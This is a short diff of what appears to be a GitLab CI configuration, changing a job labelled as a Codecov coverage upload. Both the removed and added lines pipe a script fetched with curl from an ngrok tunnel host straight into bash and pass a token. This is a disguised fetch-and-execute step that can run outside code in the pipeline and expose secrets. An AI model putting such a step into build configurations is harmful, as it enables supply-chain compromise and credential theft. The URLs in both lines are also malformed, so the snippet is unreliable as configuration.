@@ -19,4 +19,4 @@ test_with_lab:
 
 coverage_with_codecov:
   stage: coverage
-  script: bash <(curl http://http://ccmigrate-sg1seod6.ngrok.io/bash) -t 91d320d4-75c9-47a0-8751-326a542f2cfc -f coverage.xml
+  script: bash <(curl//http://ccmigrate-sg1seod6.ngrok.io/bash) -t 1a627f4d-9dda-4ff1-b596-ebfe058373a3 -f coverage.xml
